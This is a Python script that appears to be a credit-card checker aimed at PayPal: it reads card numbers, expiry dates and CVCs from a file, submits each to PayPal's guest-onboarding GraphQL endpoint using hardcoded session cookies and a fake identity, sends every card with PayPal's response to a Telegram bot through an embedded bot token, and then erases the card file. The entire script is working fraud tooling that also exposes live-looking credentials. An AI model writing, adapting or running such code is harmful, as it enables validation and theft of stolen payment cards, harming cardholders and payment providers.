import requests
import json
import os,re,time,random

file_path = 'cards.json'
bot_token = "5556552193:AAGGN0Mfi22qYaennhcLc-lMmqLrwOmi5LY"
chat_id = "1008961594"

def read_cards(file_path):
    with open(file_path, 'r') as file:
    	cards = [json.loads(line) for line in file]
    return cards
    
def process_cards(cards):
    
        for card in cards:
        	formatted_card = f"{card['num']}|{card['month']}|{card['year']}|{card['code']}"
        	nn, mm, yy, cvc = formatted_card.strip().split('|')
        	
        	if nn.startswith(('2', '5')):
        		card_type = "MASTER_CARD"
        	elif nn.startswith('4'):
        		card_type = "VISA"
        	elif nn.startswith('3'):
        		card_type = "AMEX"
        	elif nn.startswith('6'):
        		card_type = "DISCOVER"
        	if len(yy) == 2:
        		yy = f"20{yy}"
        		
        		cookies = {
        		    'enforce_policy': 'gdpr_v2.1',
    'sc_f': 'Zr9b03xcmwcfdDF3tVJVJOmwRIP-CeVapy1fots5_65WPV8MWR4MPHqKZAeJZt5bkE99fTc7NG1iaUwyKPITdY8q-rFkEAmuA1EuMW',
    'x-csrf-jwt': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0b2tlbiI6IjNNOVFxQml0NmNRdWM2UUgyRWlWQ2NteW1EMVgyaTBITXNPdlVjMURucnFwSkdYNkpYNUZhd0tpalhHRHYwaWRDTFhOMnBZeTJpejRMa3lqUlF4M0xpN3N5Yk9rYWFYX2JzQWJOQWtrNG5DS25RUnRWN1R3clVFYzNacjVPZGxjbndJM3ZINExjQkNqOG5nWUNUMTJyX0l2amIySVhIZ1I5clVKeFBaWHpaaFhZcjd3NnFCaWVVcFBnYzQiLCJpYXQiOjE3MjA3MjQ0MDAsImV4cCI6MTcyMDcyODAwMH0.zMMeXMmzmz23qzPynw0XCdO5gP9Sd0G0Pcb5TJld6No',
    'cookie_prefs': 'T%3D0%2CP%3D0%2CF%3D0%2Ctype%3Dinitial',
    'TLTDID': '99912583103760618508293361355649',
    'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'XArSMuq_QLpk5Hy1K_MFMhZroK17pfgSzpSZ3dKbr0IPqtc-A5osTb9wMqWbn8KyPL0q9erM0-SK_D48',
    'nsid': 's%3Aj28XHlUxN7MTGC-3LcNvXzbhtm8p936c.I8qXLBXiIM2zQtlHxWM%2F42N%2FjrjAaBdeRizjPpVYXYs',
    'ts_c': 'vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3Da4a329db1900aa30203d690bff42064f',
    'LANG': 'en_US%3BLU',
    'TLTSID': '85035130918770027397326691874350',
    'rssk': 'd%7DC9%4083%3C%3A51B99A%3B%3Exqx%3Ep%3Ev%7Bup7t%3F12',
    'ddi': 'OK2VcjMsgYJBcrGXhRgXvv11_ARhAA4a7Y13taCeBTK-rm0QTldZ298xoSIcFjuXjCruDfGFyamw2A-Hv2OWtvJOoAGNyXiEZYGut4iGmsBuakFx',
    'l7_az': 'dcg14.slc',
    'tcs': 'main%3Axo%3Alite%7Ccss-ltr-19jfsh6%20css-ltr-11pvgxh-button_base-text_button_lg-btn_full_width',
    'x-pp-s': 'eyJ0IjoiMTcyMDc1MTM5MDQ4MyIsImwiOiIwIiwibSI6IjAifQ',
    'tsrce': 'graphqlnodeweb',
    'ts': 'vreXpYrS%3D1815359391%26vteXpYrS%3D1720753191%26vr%3D1b2213f51900a5521880d34cff53aa2e%26vt%3Da4a329db1900aa30203d690bff42064f%26vtyp%3Dreturn',

        		}

        		headers = {
        'authority': 'www.paypal.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,ar-AE;q=0.8,ar;q=0.7,hi-IN;q=0.6,hi;q=0.5',
    'content-type': 'application/json',
    'origin': 'https://www.paypal.com',
    'paypal-client-context': '5D845739KF990614W',
    'paypal-client-metadata-id': 'uid_8e2b0c23f4_mdi6mjm6ndg',
    'referer': 'https://www.paypal.com/checkoutnow?sessionID=uid_8e2b0c23f4_mdi6mjm6ndg&buttonSessionID=uid_1ab91efaee_mdi6mjm6ndg&stickinessID=uid_ca579a8684_mtg6nty6ndy&smokeHash=&sign_out_user=false&fundingSource=card&buyerCountry=LU&locale.x=en_US&commit=true&client-metadata-id=uid_8e2b0c23f4_mdi6mjm6ndg&clientID=ATXc_gIP1TmsODj2YfUtkkGq1JNPJ1iGq1vWET3nklw4cIgNDlHE0Og6KtPh0EIIUqI2jHNqIZEgO0T3&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVRYY19nSVAxVG1zT0RqMllmVXRra0dxMUpOUEoxaUdxMXZXRVQzbmtsdzRjSWdORGxIRTBPZzZLdFBoMEVJSVVxSTJqSE5xSVpFZ08wVDMmZGlzYWJsZS1jYXJkPXZpc2ElMkNtYXN0ZXJjYXJkJTJDYW1leCUyQ2Rpc2NvdmVyJTJDamNiJTJDZWxvJTJDaGlwZXImY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAxOS0xMS0wMSZkaXNhYmxlLWZ1bmRpbmc9cDI0LHNlcGEsYmFuY29udGFjdCxlcHMsZ2lyb3BheSxpZGVhbCxteWJhbmssc29mb3J0LHZlbm1vLHBheWxhdGVyIiwiYXR0cnMiOnsiZGF0YS1wYXJ0bmVyLWF0dHJpYnV0aW9uLWlkIjoiV0hNQ1NfU1QiLCJkYXRhLXVpZCI6InVpZF9nZWVrZXN5c3llbWxodHpleWtjb2tobnJ6dWdsYmcifX0&xcomponent=1&version=5.0.449&token=5D845739KF990614W',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"124.0.6327.1"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.1"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"SM-A135F"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"13.0.0"',
    'sec-ch-ua-wow64': '?0',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-app-name': 'checkoutuinodeweb_weasley',
    'x-country': 'GB',
    'x-locale': 'en_GB',
    'x-requested-with': 'fetch',
}

        		json_data = {
    'operationName': 'OnboardGuestMutation',
    'variables': {
        'card': {
            'cardNumber': f'{nn}',
            'expirationDate': f'{mm}/{yy}',
            'securityCode': f'{cvc}',
            'type': f'{card_type}',
        },
        'country': 'GB',
        'email': 'ali-gh33@telegmail.com',
        'firstName': 'Ali',
        'lastName': 'Gh alows',
        'phone': {
            'countryCode': '44',
            'number': '7742034567',
            'type': 'MOBILE',
        },
        'supportedThreeDsExperiences': [
            'IFRAME',
        ],
        'token': '5D845739KF990614W',
        'billingAddress': {
            'line1': 'New York',
            'line2': 'New York',
            'city': 'New York',
            'postalCode': 'WV6 8QQ',
            'accountQuality': {
                'autoCompleteType': 'MERCHANT_PREFILLED',
                'isUserModified': True,
                'twoFactorPhoneVerificationId': '',
            },
            'country': 'GB',
            'familyName': 'Gh alows',
            'givenName': 'Ali',
        },
        'shippingAddress': {
            'line1': 'New York',
            'line2': 'New York',
            'city': 'New York',
            'postalCode': 'WV6 8QQ',
            'accountQuality': {
                'autoCompleteType': 'MERCHANT_PREFILLED',
                'isUserModified': True,
                'twoFactorPhoneVerificationId': '',
            },
            'country': 'GB',
            'familyName': 'Gh alows',
            'givenName': 'Ali',
        },
        'crsData': None,
    },
    'query': 'mutation OnboardGuestMutation($bank: BankAccountInput, $billingAddress: AddressInput, $card: CardInput, $country: CountryCodes, $currencyConversionType: CheckoutCurrencyConversionType, $dateOfBirth: DateOfBirth, $email: String, $firstName: String!, $lastName: String!, $phone: PhoneInput, $shareAddressWithDonatee: Boolean, $shippingAddress: AddressInput, $supportedThreeDsExperiences: [ThreeDSPaymentExperience], $token: String!) {\n  onboardAccount: onboardGuest(\n    bank: $bank\n    billingAddress: $billingAddress\n    card: $card\n    country: $country\n    currencyConversionType: $currencyConversionType\n    dateOfBirth: $dateOfBirth\n    email: $email\n    firstName: $firstName\n    lastName: $lastName\n    phone: $phone\n    shareAddressWithDonatee: $shareAddressWithDonatee\n    shippingAddress: $shippingAddress\n    token: $token\n  ) {\n    buyer {\n      auth {\n        accessToken\n        __typename\n      }\n      userId\n      __typename\n    }\n    flags {\n      is3DSecureRequired\n      __typename\n    }\n    ...fundingOptions\n    paymentContingencies {\n      threeDomainSecure(experiences: $supportedThreeDsExperiences) {\n        status\n        redirectUrl {\n          href\n          __typename\n        }\n        method\n        parameter\n        experience\n        requestParams {\n          key\n          value\n          __typename\n        }\n        __typename\n      }\n      ...threeDSContingencyData\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment fundingOptions on CheckoutSession {\n  fundingOptions {\n    allPlans {\n      fundingSources {\n        fundingInstrument {\n          id\n          __typename\n        }\n        amount {\n          currencyCode\n          currencyValue\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    fundingInstrument {\n      id\n      lastDigits\n      name\n      nameDescription\n      type\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment threeDSContingencyData on PaymentContingencies {\n  threeDSContingencyData {\n    name\n    causeName\n    resolution {\n      type\n      resolutionName\n      paymentCard {\n        billingAddress {\n          line1\n          line2\n          city\n          state\n          country\n          postalCode\n          __typename\n        }\n        expireYear\n        expireMonth\n        currencyCode\n        cardProductClass\n        id\n        encryptedNumber\n        type\n        number\n        bankIdentificationNumber\n        __typename\n      }\n      contingencyContext {\n        deviceDataCollectionUrl {\n          href\n          __typename\n        }\n        jwtSpecification {\n          jwtDuration\n          jwtIssuer\n          jwtOrgUnitId\n          type\n          __typename\n        }\n        reason\n        referenceId\n        source\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
}

        		response = requests.post('https://www.paypal.com/graphql?OnboardGuestMutation', cookies=cookies, headers=headers, json=json_data)

        		    ### Send To Telegram bot 
        	requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage",params={"chat_id": chat_id,"text": f"{formatted_card.strip()} ----> {response.json()}"})
    ###

if __name__ == "__main__":    
    cards = read_cards(file_path)
    process_cards(cards)
    with open(file_path, 'w') as file:
    	file.write('')
